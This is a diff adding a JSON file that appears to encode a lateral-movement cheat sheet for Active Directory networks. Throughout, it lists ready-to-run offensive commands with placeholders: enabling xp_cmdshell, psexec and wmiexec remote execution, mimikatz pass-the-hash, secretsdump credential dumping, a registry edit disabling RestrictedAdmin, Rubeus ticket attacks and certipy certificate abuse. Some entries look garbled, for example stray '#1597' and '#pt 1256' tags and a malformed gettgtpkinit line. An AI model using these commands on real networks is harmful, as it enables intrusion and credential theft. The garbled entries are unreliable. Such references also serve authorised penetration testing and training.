@@ -1,0 +1,204 @@
+{
+  "Lateral_Movement": {
+    "WSUS_Methods": {
+      "WSUSpect": {
+        "command": "WSUSpect.ps1 # need compromised WSUS server"
+      },
+      "SCCM_Admin": {
+        "tools": ["CMPivot", "PowerSCCM", "SharpSCCM"],
+        "result": "Administrator access"
+      }
+    },
+    "MSSQL": {
+      "initial_access": {
+        "command": "cme mssql <ip> -u <user> -p <password> -d <domain>",
+        "query": "MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p"
+      },
+      "methods": {
+        "SQLAdmin": {
+          "commands": [
+            "EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;",
+            "EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+            "EXEC xp_cmdshell '<cmd>'"
+          ],
+          "result": "Low Access"
+        },
+        "trust_link": {
+          "commands": [
+            "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance> -Query \"<query>\"",
+            "use exploit/windows/mssql/mssql_linkcrawler"
+          ],
+          "result": "MSSQL"
+        },
+        "client_operations": {
+          "command": "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip> (or #1597)",
+          "sub_commands": {
+            "enum_db": {
+              "enable_shell": {
+                "command": "enable_xp_cmdshell",
+                "execution": "xp_cmdshell <cmd>",
+                "result": "Low Access"
+              }
+            },
+            "enum_impersonate": {
+              "commands": [
+                "exec_as_user <user>",
+                "exec_as_login <login>"
+              ],
+              "result": "MSSQL"
+            },
+            "dir_operations": {
+              "command": "xp_dirtree <ip>",
+              "result": "coerce SMB ->"
+            },
+            "trustlink": {
+              "commands": ["sp_linkedservers", "use_link"],
+              "result": "MSSQL"
+            }
+          }
+        }
+      }
+    },
+    "Local_User": {
+      "commands": [
+        "cme smb -u <user> -p <pass> <ip> --local-auth",
+        "impacket like cleartext password without domain/"
+      ],
+      "result": "Administrator access"
+    },
+    "Password_Methods": {
+      "Cleartext_Password": {
+        "interactive_shell": {
+          "commands": [
+            "psexec.py <domain>/<user>:<password>@<ip>",
+            "psexec.exe -AcceptEULA \\<ip>",
+            "mimikatz \"privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>\""
+          ],
+          "result": "Authority/system"
+        },
+        "pseudo_shell": {
+          "commands": [
+            "atexec.py <domain>/<user>:<password>@<ip> \"command\"",
+            "smbexec.py <domain>/<user>:<password>@<ip>",
+            "wmiexec.py <domain>/<user>:<password>@<ip>",
+            "dcomexec.py <domain>/<user>:<password>@<ip>",
+            "crackmapexec smb <ip_range> -u <user> -p <password> -d <domain>",
+            "crackmapexec smb <ip_range> -u <user> -p <password> --local-auth"
+          ],
+          "result": "Authority/system"
+        },
+        "additional_methods": {
+          "WinRM": {
+            "command": "evil-winrm -i <ip> -u <user> -p <password>",
+            "result": "Low access"
+          },
+          "RDP": {
+            "command": "xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>",
+            "access_levels": ["Low access", "High access"]
+          },
+          "SMB": {
+            "command": "smbclient.py <domain>/<user>:<password>@<ip>",
+            "action": "search files"
+          },
+          "MSSQL": {
+            "commands": [
+              "crackmapexec mssql <ip_range> -u <user> -p <password>",
+              "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
+            ],
+            "result": "MSSQL"
+          }
+        }
+      }
+    },
+    "NTLM_Hash": {
+      "Pass_the_Hash": {
+        "interactive_shell": {
+          "commands": [
+            "psexec.py -hashes \"<hash>\" <user>@<ip>",
+            "psexec.exe -AcceptEULA \\<ip>",
+            "mimikatz \"privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>\""
+          ],
+          "result": "Authority/system"
+        },
+        "pseudo_shell": {
+          "commands": [
+            "atexec.py -hashes \"<hash>\" <user>@<ip> \"command\"",
+            "smbexec.py -hashes \"<hash>\" <user>@<ip>",
+            "wmiexec.py -hashes \"<hash>\" <user>@<ip>",
+            "dcomexec.py -hashes \"<hash>\" <user>@<ip>",
+            "crackmapexec smb <ip_range> -u <user> -d <domain> -H <hash>",
+            "crackmapexec smb <ip_range> -u <user> -H '<hash>' --local-auth"
+          ]
+        },
+        "connection_methods": {
+          "WinRM": "evil-winrm -i <ip> -u <user> -H <hash>",
+          "RDP": {
+            "registry_mod": {
+              "command": "reg.py <domain>/<user>@<ip> -hashes '<hash>' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt REG_DWORD -vd '0'",
+              "connection": "xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>"
+            }
+          },
+          "SMB": "smbclient.py -hashes \"<hash>\" <user>@<ip>"
+        }
+      },
+      "overpass_PTK": {
+        "commands": [
+          "Rubeus.exe asktgt /user:victim /rc4:<rc4value>",
+          "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe|\\apppcont.exe",
+          "getTGT.py <domain>/<user> -hashes <hashes>",
+          "getTGT.py -aesKey <key> <domain>/<user>@<ip>"
+        ],
+        "result": "Pass the ticket"
+      }
+    },
+    "Kerberos": {
+      "Pass_the_Ticket": {
+        "ccache_kirbi": {
+          "format_conversion": "ticketConverter.py <kirbi|ccache> <ccache|kirbi>",
+          "tools": [
+            "mimikatz kerberos::ptc \"<ticket>\"",
+            "Rubeus.exe ptt /ticket:<ticket>",
+            "proxychains secretsdump -k <domain>/<user>@<ip>"
+          ],
+          "modify_SPN": "tgsub.py -i <ticket_ccache> -out <new/ticket_ccache> -altservice \"<service>/<target>\" #pt 1256"
+        },
+        "aesKey": {
+          "notes": "impacket tools: Same as Pass the hash but use --aesKey for impacket (and use FQDN)",
+          "commands": [
+            "proxychains secretsdump -aesKey <key> <domain>/<user>@<ip>",
+            "proxychains lookupsid.py <domain>/<user>@<ip> --no-pass --domain-sids",
+            "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> --no-pass",
+            "proxychains secretsdump --no-pass <domain>/<user>@<ip>"
+          ]
+        }
+      },
+      "Socks_NTLM_Relay": {
+        "pseudo_shell": {
+          "commands": [
+            "proxychains atexec.py --no-pass <domain>/<user>@<ip> \"command\"",
+            "proxychains smbexec.py --no-pass <domain>/<user>@<ip>"
+          ],
+          "result": "Authority/system"
+        },
+        "file_operations": "proxychains smbclient.py --no-pass <user>@<ip>"
+      },
+      "Certificate_pfx": {
+        "get_hash": "certipy auth -pfx <cert_file> -dc-ip <dc_ip>",
+        "pkinit": {
+          "commands": [
+            "gettgtpkinit.py -cert-pfx \"<pfx_file>\" -pfx-pass \"<cert-password>\" [-fqdn.domain>/<user>\" \"<tgt_ccache_file>\"",
+            "Rubeus.exe asktgt /user:\"<username>\" /certificate:<pfx_file> /password:\"<certificate_password>\" /domain:\"<fqdn.domain>\" /dc:<dc>\" /show"
+          ]
+        },
+        "Pass_Certificate": {
+          "commands": [
+            "certipy auth -pfx <cert_file> -dc-ip <dc_ip>",
+            "certipy auth -pfx <cert_file> -ldap-shell"
+          ],
+          "actions": ["add_computer", "set_rbcd"],
+          "result": "RBCD"
+        }
+      }
+    }
+  }
+}
